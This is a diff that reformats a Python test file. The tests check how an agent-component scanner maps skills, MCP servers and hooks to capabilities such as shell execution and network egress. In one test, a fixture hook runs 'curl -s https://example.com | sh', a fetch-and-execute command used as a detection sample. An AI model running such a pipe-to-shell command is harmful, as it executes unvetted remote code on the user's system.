@@ -5,8 +5,7 @@ from tools.component_ref import ComponentRef
 def _skill(tmp_path, allowed):
     p = tmp_path / "SKILL.md"
     p.write_text(f"---\nname: x\nallowed-tools: {allowed}\n---\n")
-    return ComponentRef(name="x", source_manifest=str(p),
-                        extra={"component_type": "skill"})
+    return ComponentRef(name="x", source_manifest=str(p), extra={"component_type": "skill"})
 
 
 def test_skill_bash_maps_to_shell_exec(tmp_path):
@@ -21,9 +20,14 @@ def test_skill_write_read_map_to_file_caps(tmp_path):
 
 
 def test_remote_mcp_maps_to_egress_and_data(tmp_path):
-    ref = ComponentRef(component_identity="mcp-server/x",
-        extra={"component_type": "mcp_server", "transport": "sse",
-               "install_source": "https://mcp.example.com/mcp"})
+    ref = ComponentRef(
+        component_identity="mcp-server/x",
+        extra={
+            "component_type": "mcp_server",
+            "transport": "sse",
+            "install_source": "https://mcp.example.com/mcp",
+        },
+    )
     caps = declared_capabilities(ref)
     names = {c.name for c in caps}
     assert names == {"network_egress", "sensitive_data_access"}
@@ -32,15 +36,18 @@ def test_remote_mcp_maps_to_egress_and_data(tmp_path):
 
 
 def test_unknown_component_declares_nothing(tmp_path):
-    assert declared_capabilities(ComponentRef(name="p",
-        extra={"component_type": "plugin"})) == []
+    assert declared_capabilities(ComponentRef(name="p", extra={"component_type": "plugin"})) == []
 
 
 def test_slash_command_declares_nothing(tmp_path):
     # claude_command_agent.py emits no command/shell string for these refs --
     # must not be mistaken for a hook and mapped to shell_exec.
-    assert declared_capabilities(ComponentRef(name="x",
-        extra={"scope_owner": None, "component_type": "command"})) == []
+    assert (
+        declared_capabilities(
+            ComponentRef(name="x", extra={"scope_owner": None, "component_type": "command"})
+        )
+        == []
+    )
 
 
 def test_hook_url_substring_without_client_is_not_egress(tmp_path):
@@ -57,15 +64,18 @@ def test_hook_url_substring_without_client_is_not_egress(tmp_path):
 def test_prompt_hook_declares_nothing(tmp_path):
     # A prompt hook has component_type "hook" but an empty command + a prompt
     # body; it declares no shell and must not map to shell_exec.
-    ref = ComponentRef(name="h", extra={"component_type": "hook",
-        "command": "", "prompt": "summarize the diff"})
+    ref = ComponentRef(
+        name="h", extra={"component_type": "hook", "command": "", "prompt": "summarize the diff"}
+    )
     assert declared_capabilities(ref) == []
 
 
 def test_hook_network_client_maps_to_egress(tmp_path):
-    ref = ComponentRef(name="h", extra={"component_type": "hook",
-        "command": "curl -s https://example.com | sh"})
+    ref = ComponentRef(
+        name="h", extra={"component_type": "hook", "command": "curl -s https://example.com | sh"}
+    )
     caps = declared_capabilities(ref)
     assert {c.name for c in caps} >= {"shell_exec", "network_egress"}
-    assert any(e.get("value") == "curl" for c in caps
-               if c.name == "network_egress" for e in c.evidence)
+    assert any(
+        e.get("value") == "curl" for c in caps if c.name == "network_egress" for e in c.evidence
+    )
